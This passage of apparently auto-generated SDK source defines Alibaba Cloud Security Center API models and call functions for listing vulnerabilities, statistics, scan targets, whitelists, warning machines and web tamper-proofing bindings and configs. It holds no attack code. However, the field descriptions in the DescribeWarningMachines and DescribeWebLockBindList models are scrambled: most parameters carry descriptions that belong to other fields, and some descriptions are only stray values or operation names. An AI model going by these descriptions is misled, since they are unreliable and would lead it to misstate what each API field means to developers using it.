      internetIp?: string(name='InternetIp', description='The public IP address of the asset.', example='1.2.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the asset.', example='1.2.XX.XX'),
      lastTs?: long(name='LastTs', description='The timestamp when the vulnerability was last detected. Unit: milliseconds.', example='1620404763000'),
      modifyTs?: long(name='ModifyTs', description='The timestamp when the vulnerability status was modified. Unit: milliseconds.', example='1620404763000'),
      name?: string(name='Name', description='The name of the vulnerability.', example='oval:com.redhat.rhsa:def:20170574'),
      necessity?: string(name='Necessity', description='The priority to fix the vulnerability. Valid values:

*   **asap**: high
*   **later**: medium
*   **nntf**: low

> We recommend that you fix the vulnerabilities that have the **high** priority at the earliest opportunity.', example='asap'),
      online?: boolean(name='Online', description='Indicates whether the Security Center agent on the asset is online. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
      osName?: string(name='OsName', description='The name of the operating system for your asset.', example='CentOS 7.2 64-bit'),
      osVersion?: string(name='OsVersion', description='The name of the operating system for your asset.', example='linux'),
      primaryId?: long(name='PrimaryId', description='The ID of the vulnerability.', example='101162078'),
      raspDefend?: int32(name='RaspDefend'),
      raspStatus?: int32(name='RaspStatus'),
      regionId?: string(name='RegionId', description='The ID of the region in which the server resides.', example='cn-hangzhou'),
      related?: string(name='Related', description='The Common Vulnerabilities and Exposures (CVE) IDs related to the vulnerability. Multiple CVE IDs are separated by commas (,).', example='CVE-2017-7518,CVE-2017-12188'),
      repairTs?: long(name='RepairTs', description='The timestamp when the vulnerability was fixed. Unit: milliseconds.', example='1541207563000'),
      resultCode?: string(name='ResultCode', description='The code that indicates the vulnerability fixing result.', example='0'),
      resultMessage?: string(name='ResultMessage', description='The message that indicates the vulnerability fixing result.', example='timeout'),
      status?: int32(name='Status', description='The status of the vulnerability. Valid values:

*   **1**: unfixed
*   **2**: fix failed
*   **3**: rollback failed
*   **4**: fixing
*   **5**: being rolled back
*   **6**: being verified
*   **7**: fixed
*   **8**: fixed and to be restarted
*   **9**: rolled back
*   **10**: ignored
*   **11**: rolled back and to be restarted
*   **12**: not found
*   **20**: expired', example='1'),
      tag?: string(name='Tag', description='The tag that is added to the vulnerability.', example='oval'),
      type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability
*   **cms**: Web-CMS vulnerability
*   **emg**: urgent vulnerability
*   **app**: application vulnerability
*   **sca**: application vulnerability that is detected by using software component analysis', example='cve'),
      uuid?: string(name='Uuid', description='The UUID of the asset.', example='04c56617-23fc-43a5-ab9b-****'),
    }
  ](name='VulRecords', description='An array that consists of the details about the vulnerability.'),
}

model DescribeVulListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVulListResponseBody(name='body'),
}

async function describeVulListWithOptions(request: DescribeVulListRequest, runtime: Util.RuntimeOptions): DescribeVulListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.aliasName)) {
    query['AliasName'] = request.aliasName;
  }
  if (!Util.isUnset(request.attachTypes)) {
    query['AttachTypes'] = request.attachTypes;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.dealed)) {
    query['Dealed'] = request.dealed;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.necessity)) {
    query['Necessity'] = request.necessity;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  if (!Util.isUnset(request.vpcInstanceIds)) {
    query['VpcInstanceIds'] = request.vpcInstanceIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVulList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeVulList(request: DescribeVulListRequest): DescribeVulListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVulListWithOptions(request, runtime);
}

model DescribeVulListPageRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1'),
  cveId?: string(name='CveId', description='The Common Vulnerabilities and Exposures (CVE) ID of the vulnerability.', example='CVE-2022-44702'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='10'),
  vulNameLike?: string(name='VulNameLike', description='The name of the vulnerability.', example='RCE vulnerability'),
}

model DescribeVulListPageResponseBody = {
  data?: [ 
    {
      cveId?: string(name='CveId', description='The CVE ID of the vulnerability.', example='CVE-2022-42836'),
      extAegis?: string(name='ExtAegis', description='The extended field for Server Guard.', example='{\\"relatedType\\":[{\\"type\\":\\"sys\\"}]}'),
      id?: long(name='Id', description='The primary key ID of the database.', example='40586'),
      isAegis?: int32(name='IsAegis', description='Indicates whether the vulnerability was detected based on version comparison. Valid values:

*   1: The vulnerability was detected based on version comparison.
*   0: The vulnerability was not detected based on version comparison.', example='1'),
      isSas?: int32(name='IsSas', description='Indicates whether the vulnerability was detected based on proof of concept (POC) verification. Valid values:

*   1: The vulnerability was detected based on POC verification.
*   0: The vulnerability was not detected based on POC verification.', example='0'),
      otherId?: string(name='OtherId', description='The ID of the vulnerability.', example='AVD-2018-8218'),
      releaseTime?: long(name='ReleaseTime', description='The time when the vulnerability was disclosed.', example='2022-12-13T08:00Z'),
      title?: string(name='Title', description='The name of the vulnerability.', example='Windows RCE vulnerability'),
    }
  ](name='Data', description='The response parameters.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='4347E985-6E64-467B-96EC-30D4EA9E32FB'),
  totalCount?: int32(name='TotalCount', description='The total number of entries.', example='100'),
}

model DescribeVulListPageResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVulListPageResponseBody(name='body'),
}

async function describeVulListPageWithOptions(request: DescribeVulListPageRequest, runtime: Util.RuntimeOptions): DescribeVulListPageResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.cveId)) {
    query['CveId'] = request.cveId;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.vulNameLike)) {
    query['VulNameLike'] = request.vulNameLike;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVulListPage',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeVulListPage(request: DescribeVulListPageRequest): DescribeVulListPageResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVulListPageWithOptions(request, runtime);
}

model DescribeVulNumStatisticsRequest {
  from?: string(name='From', example='sas'),
}

model DescribeVulNumStatisticsResponseBody = {
  appCnt?: int32(name='AppCnt', example='0'),
  appNum?: int32(name='AppNum', example='0'),
  cmsDealedTotalNum?: int32(name='CmsDealedTotalNum', example='0'),
  cmsNum?: int32(name='CmsNum', example='0'),
  cveNum?: int32(name='CveNum', example='0'),
  emgNum?: int32(name='EmgNum', example='0'),
  requestId?: string(name='RequestId', example='E22C89D2-FE13-5800-8746-9D0EF1827A59'),
  scaNum?: int32(name='ScaNum', example='0'),
  sysNum?: int32(name='SysNum', example='0'),
  vulAsapSum?: int32(name='VulAsapSum', example='0'),
  vulDealedTotalNum?: int32(name='VulDealedTotalNum', example='0'),
  vulLaterSum?: int32(name='VulLaterSum', example='0'),
  vulNntfSum?: int32(name='VulNntfSum', example='0'),
}

model DescribeVulNumStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVulNumStatisticsResponseBody(name='body'),
}

async function describeVulNumStatisticsWithOptions(request: DescribeVulNumStatisticsRequest, runtime: Util.RuntimeOptions): DescribeVulNumStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVulNumStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeVulNumStatistics(request: DescribeVulNumStatisticsRequest): DescribeVulNumStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVulNumStatisticsWithOptions(request, runtime);
}

model DescribeVulTargetConfigRequest {
  type?: string(name='Type', example='cve'),
  uuid?: string(name='Uuid', example='ae1527a9-2308-46ab-b10a-48ae7ff7****'),
}

model DescribeVulTargetConfigResponseBody = {
  requestId?: string(name='RequestId', example='9FBC6E47-7508-58C9-9E76-528E118CB1CC'),
  targetConfigs?: [ 
    {
      config?: string(name='Config', example='on'),
      overAllConfig?: string(name='OverAllConfig', example='on'),
      type?: string(name='Type', example='cve'),
    }
  ](name='TargetConfigs'),
  totalCount?: int32(name='TotalCount', example='1'),
}

model DescribeVulTargetConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVulTargetConfigResponseBody(name='body'),
}

async function describeVulTargetConfigWithOptions(request: DescribeVulTargetConfigRequest, runtime: Util.RuntimeOptions): DescribeVulTargetConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVulTargetConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeVulTargetConfig(request: DescribeVulTargetConfigRequest): DescribeVulTargetConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVulTargetConfigWithOptions(request, runtime);
}

model DescribeVulTargetStatisticsRequest {
  type?: string(name='Type', description='The type of the vulnerabilities. Valid values:

*   **cve**: Linux software vulnerabilities
*   **sys**: Windows system vulnerabilities
*   **cms**: Web-CMS vulnerabilities
*   **emg**: urgent vulnerabilities', example='cve'),
}

model DescribeVulTargetStatisticsResponseBody = {
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='10'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='23AD0BD2-8771-5647-819E-6BA51E212F80'),
  targetStats?: [ 
    {
      targets?: [ 
        {
          flag?: string(name='Flag', description='Indicates whether the configurations are applied to the server. Valid values:

*   **add**: yes
*   **del**: no', example='add'),
          target?: string(name='Target', description='The group ID or UUID of the server to which the configurations are applied.', example='0011ea53-738c-4bff-93be-ce6a1cc9****'),
          targetType?: string(name='TargetType', description='The condition by which the configurations are applied to the server. Valid values:

*   **uuid**: the UUID of the server
*   **groupId**: the ID of the server group', example='uuid'),
        }
      ](name='Targets', description='An array that consists of available servers.'),
      totalCount?: int32(name='TotalCount', description='The total number of servers.', example='1'),
      uuidCount?: int32(name='UuidCount', description='The number of servers to which the configurations are applied.', example='1'),
      vulType?: string(name='VulType', description='The type of the vulnerabilities. Valid values:

*   cve: Linux software vulnerabilities
*   sys: Windows system vulnerabilities
*   cms: Web-CMS vulnerabilities
*   emg: urgent vulnerabilities', example='cve'),
    }
  ](name='TargetStats', description='An array that consists of the configurations of the vulnerability scan feature.'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='1'),
}

model DescribeVulTargetStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVulTargetStatisticsResponseBody(name='body'),
}

async function describeVulTargetStatisticsWithOptions(request: DescribeVulTargetStatisticsRequest, runtime: Util.RuntimeOptions): DescribeVulTargetStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVulTargetStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeVulTargetStatistics(request: DescribeVulTargetStatisticsRequest): DescribeVulTargetStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVulTargetStatisticsWithOptions(request, runtime);
}

model DescribeVulWhitelistRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Pages start from page 1. Default value: 1.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 10.', example='10'),
}

model DescribeVulWhitelistResponseBody = {
  count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='10'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='74F97EF7-B543-43FD-A4E9-18456731F9C5'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='1'),
  vulWhitelists?: [ 
    {
      aliasName?: string(name='AliasName', description='The alias of the vulnerability.', example='RHSA-2017:3263: curl security update'),
      id?: string(name='Id', description='The ID of the rule.', example='1275'),
      name?: string(name='Name', description='The name of the vulnerability.', example='oval:com.redhat.rhsa:def:20173263'),
      reason?: string(name='Reason', description='The reason why the vulnerability is added to the whitelist.', example='ignore'),
      targetInfo?: string(name='TargetInfo', description='The application scope of the rule. The value is a JSON string that contains the following fields:

*   **type**: the type of the assets to which the rule is applied. Valid values:

    *   **Uuid**: server
    *   **GroupId**: server group

*   **groupIds**: the ID of the server group

*   **uuids**: the UUID of the server

> If this field is empty, the rule is applied to all assets.', example='{"type":"GroupId","groupIds":[916****],"uuids":[]}'),
      type?: string(name='Type', description='The type of the vulnerability.', example='cve'),
      whitelist?: string(name='Whitelist', description='The information about the vulnerability. The value of this parameter is in the JSON format. Valid values:

*   **name**: the name of the vulnerability
*   **type**: the type of the vulnerability.
*   **aliasName**: the alias of the vulnerability', example='[{
"name":"oval:com.redhat.rhsa:def:20173263",
"type":"cve",
"aliasName":"RHSA-2017:3263: curl security update"
}]'),
    }
  ](name='VulWhitelists', description='An array that consists of information about the whitelist of vulnerabilities.'),
}

model DescribeVulWhitelistResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVulWhitelistResponseBody(name='body'),
}

async function describeVulWhitelistWithOptions(request: DescribeVulWhitelistRequest, runtime: Util.RuntimeOptions): DescribeVulWhitelistResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVulWhitelist',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeVulWhitelist(request: DescribeVulWhitelistRequest): DescribeVulWhitelistResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVulWhitelistWithOptions(request, runtime);
}

model DescribeWarningExportInfoRequest {
  exportId?: long(name='ExportId', description='The name of the exported Excel file.', example='14356'),
}

model DescribeWarningExportInfoResponseBody = {
  currentCount?: int32(name='CurrentCount', example='1'),
  exportStatus?: string(name='ExportStatus', example='success'),
  fileName?: string(name='FileName', example='app_20210917'),
  id?: long(name='Id', example='131231'),
  link?: string(name='Link', description='Queries the progress of a export task for a baseline check result.', example='https://eds.aliyun.com/notification/entitle/64b5c3e2-e52b-4d29-9617-e7e6d74XXXX'),
  message?: string(name='Message', example='successful'),
  progress?: int32(name='Progress', description='DescribeWarningExportInfo', example='100'),
  requestId?: string(name='RequestId', example='79CFF74D-E967-5407-8A78-EE03B925FDAA'),
  totalCount?: int32(name='TotalCount', example='100'),
}

model DescribeWarningExportInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWarningExportInfoResponseBody(name='body'),
}

async function describeWarningExportInfoWithOptions(request: DescribeWarningExportInfoRequest, runtime: Util.RuntimeOptions): DescribeWarningExportInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.exportId)) {
    query['ExportId'] = request.exportId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeWarningExportInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeWarningExportInfo(request: DescribeWarningExportInfoRequest): DescribeWarningExportInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWarningExportInfoWithOptions(request, runtime);
}

model DescribeWarningMachinesRequest {
  clusterId?: string(name='ClusterId', description='The type of the query condition. Valid values:

*   **containerId**: the ID of the container
*   **uuid**: the UUID of the asset', example='c7e3c5b420a7947c2933303144688****'),
  containerFieldName?: string(name='ContainerFieldName', description='The number of the page to return. Default value: **1**.', example='containerId'),
  containerFieldValue?: string(name='ContainerFieldValue', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='c8bb3ef0f5ccf45508f0fd1ffc200****'),
  currentPage?: int32(name='CurrentPage', description='The name of the server.', example='1'),
  groupId?: long(name='GroupId', example='123'),
  haveRisk?: int32(name='HaveRisk', description='The number of **low-risk** items on the server.', example='1'),
  lang?: string(name='Lang', description='The private IP address of the server.', example='zh'),
  machineName?: string(name='MachineName', description='The source IP address of the request.', example='oracle-win-001****'),
  pageSize?: int32(name='PageSize', description='The number of **medium-risk** items on the server.', example='10'),
  riskId?: long(name='RiskId', description='The UUID of the server on which the baseline check is performed.', example='196'),
  sourceIp?: string(name='SourceIp', description='The ID of the baseline check policy.', example='1.2.XX.XX'),
  strategyId?: long(name='StrategyId', description='The page number of the returned page.', example='16'),
  targetType?: string(name='TargetType', description='Specifies whether risks were detected. Valid values:

*   **1**: yes
*   **0**: no', example='uuid'),
  uuids?: string(name='Uuids', description='The ID of the server.', example='9888955c-0076-49da-bd9c-34f5492b****'),
}

model DescribeWarningMachinesResponseBody = {
  count?: int32(name='Count', description='The verification status of the risk item after the risk item is fixed. Valid values:

*   **1**: complete
*   **2**: verifying', example='10'),
  currentPage?: int32(name='CurrentPage', description='The name of the server on which the baseline check is performed.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **10**.', example='10'),
  requestId?: string(name='RequestId', description='An array that consists of the servers.', example='6E4CBE87-E887-5AF1-86D2-78EB4AA3E771'),
  totalCount?: int32(name='TotalCount', description='The value of the field that is used to search for the container.', example='1'),
  warningMachines?: [ 
    {
      authVersion?: int32(name='AuthVersion', example='7'),
      bind?: boolean(name='Bind', example='true'),
      containerId?: string(name='ContainerId'),
      containerName?: string(name='ContainerName'),
      highWarningCount?: int32(name='HighWarningCount', description='The public IP address of the server.', example='10'),
      instanceId?: string(name='InstanceId', description='The number of entries returned per page. Default value: **10**.', example='i-m5ee8b9nr3h30mhb****'),
      instanceName?: string(name='InstanceName', example='oracle-win-00****'),
      internetIp?: string(name='InternetIp', description='The UUID of the server on which the baseline check is performed. Separate multiple UUIDs with commas (,).', example='1.2.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The ID of the request, which is used to locate and troubleshoot issues.', example='1.2.XX.XX'),
      lowWarningCount?: int32(name='LowWarningCount', description='Queries information about servers on which a baseline check is performed. The information includes the IDs of the servers, the statistics of a risk item, and the status of the risk item.', example='3'),
      mediumWarningCount?: int32(name='MediumWarningCount', example='2'),
      passCount?: int32(name='PassCount', example='10'),
      portOpen?: boolean(name='PortOpen', description='DescribeWarningMachines', example='true'),
      regionId?: string(name='RegionId', description='The number of entries returned on the current page.', example='cn-qingdao'),
      status?: int32(name='Status', description='Indicates whether Security Center is authorized to protect the asset. Valid values:

*   **true**: yes
*   **false**: no', example='1'),
      uuid?: string(name='Uuid', example='9888955c-0076-49da-bd9c-34f5492b****'),
    }
  ](name='WarningMachines', description='The ID of the container cluster.

>  You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of container clusters.'),
}

model DescribeWarningMachinesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWarningMachinesResponseBody(name='body'),
}

async function describeWarningMachinesWithOptions(request: DescribeWarningMachinesRequest, runtime: Util.RuntimeOptions): DescribeWarningMachinesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.containerFieldName)) {
    query['ContainerFieldName'] = request.containerFieldName;
  }
  if (!Util.isUnset(request.containerFieldValue)) {
    query['ContainerFieldValue'] = request.containerFieldValue;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.haveRisk)) {
    query['HaveRisk'] = request.haveRisk;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.machineName)) {
    query['MachineName'] = request.machineName;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.riskId)) {
    query['RiskId'] = request.riskId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.strategyId)) {
    query['StrategyId'] = request.strategyId;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeWarningMachines',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeWarningMachines(request: DescribeWarningMachinesRequest): DescribeWarningMachinesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWarningMachinesWithOptions(request, runtime);
}

model DescribeWebLockBindListRequest {
  currentPage?: int32(name='CurrentPage', description='on', example='1'),
  lang?: string(name='Lang', description='The error code for web tamper proofing. Valid values:

*   **2001**: The Security Center agent is offline.
*   **9999**: The connection timed out.', example='zh'),
  pageSize?: int32(name='PageSize', description='The error message for web tamper proofing. Valid values:

*   **client offline**: The Security Center agent is offline.
*   **timeout**: The connection timed out.', example='20'),
  remark?: string(name='Remark', description='The page number of the returned page. Pages start from page 1. Default value: 1.', example='192.168.XX.XX'),
  sourceIp?: string(name='SourceIp', description='The language of the content within the request and the response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='116.30.XX.XX'),
  status?: string(name='Status', description='The name of the server.', example='on'),
}

model DescribeWebLockBindListResponseBody = {
  bindList?: [ 
    {
      auditCount?: string(name='AuditCount', description='The starting progress percentage of web tamper proofing. Valid values: 0 to 100.', example='2'),
      blockCount?: string(name='BlockCount', description='Queries the information about the servers that have web tamper proofing enabled.', example='10'),
      dirCount?: string(name='DirCount', description='The information about the servers that have web tamper proofing enabled.', example='5'),
      instanceName?: string(name='InstanceName', description='The ID of the request, which is used to locate and troubleshoot issues.', example='testName'),
      internetIp?: string(name='InternetIp', description='The number of alerts.', example='54.169.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The number of blocked tampering events.', example='192.168.XX.XX'),
      os?: string(name='Os', description='20', example='Linux'),
      percent?: int32(name='Percent', description='The protection status of the server. Valid values:

*   **on**: protected
*   **off**: unprotected', example='99'),
      serviceCode?: string(name='ServiceCode', description='The number of entries returned per page. Default value: 20.', example='2001'),
      serviceDetail?: string(name='ServiceDetail', description='The protection status of the server that you want to query. Valid values:

*   **on**: protected
*   **off**: unprotected', example='client offline'),
      serviceStatus?: string(name='ServiceStatus', description='192.168.XX.XX', example='stop'),
      status?: string(name='Status', description='The string that allows you to search for servers in fuzzy match mode. You can enter a server name or IP address.', example='on'),
      uuid?: string(name='Uuid', description='The number of the page to return. Pages start from page 1. Default value: 1.', example='inet-12345****'),
    }
  ](name='BindList', description='116.30.XX.XX'),
  currentPage?: int32(name='CurrentPage', description='The private IP address of the server.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of protected directories.', example='20'),
  requestId?: string(name='RequestId', description='The operating system that the server runs.', example='D9354C1A-D709-4873-9AAE-41513327B247'),
  totalCount?: int32(name='TotalCount', description='The information about the servers that have web tamper proofing enabled.', example='11409'),
}

model DescribeWebLockBindListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWebLockBindListResponseBody(name='body'),
}

async function describeWebLockBindListWithOptions(request: DescribeWebLockBindListRequest, runtime: Util.RuntimeOptions): DescribeWebLockBindListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeWebLockBindList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeWebLockBindList(request: DescribeWebLockBindListRequest): DescribeWebLockBindListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWebLockBindListWithOptions(request, runtime);
}

model DescribeWebLockConfigListRequest {
  lang?: string(name='Lang', example='zh'),
  sourceIp?: string(name='SourceIp', example='1.2.3.4'),
  uuid?: string(name='Uuid', example='inet-1234567****'),
}

model DescribeWebLockConfigListResponseBody = {
  configList?: [ 
    {
      defenceMode?: string(name='DefenceMode', example='audit'),
      dir?: string(name='Dir', example='/www/tmp/'),
      exclusiveDir?: string(name='ExclusiveDir', example='/home/admin/tomcat'),
      exclusiveFile?: string(name='ExclusiveFile', example='/home/admin/tomcat/localhost.log'),
      exclusiveFileType?: string(name='ExclusiveFileType', example='*.jpg'),
      id?: string(name='Id', example='11'),
      inclusiveFile?: string(name='InclusiveFile', example='/home/admin/tomcat/aaa.log'),
      inclusiveFileType?: string(name='InclusiveFileType', example='jpg'),
      localBackupDir?: string(name='LocalBackupDir', example='/usr/local/backup'),
      mode?: string(name='Mode', example='blacklist'),
      uuid?: string(name='Uuid', example='80d2f7d6-31a9-4d7f-8ff4-7ecc42f8****'),
    }
  ](name='ConfigList'),
  requestId?: string(name='RequestId', example='D9354C1A-D709-4873-9AAE-41513327B247'),
  totalCount?: int32(name='TotalCount', example='1'),
}

model DescribeWebLockConfigListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWebLockConfigListResponseBody(name='body'),
}

async function describeWebLockConfigListWithOptions(request: DescribeWebLockConfigListRequest, runtime: Util.RuntimeOptions): DescribeWebLockConfigListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeWebLockConfigList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeWebLockConfigList(request: DescribeWebLockConfigListRequest): DescribeWebLockConfigListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWebLockConfigListWithOptions(request, runtime);
}

model DescribeWebLockExclusiveFileTypeResponseBody = {
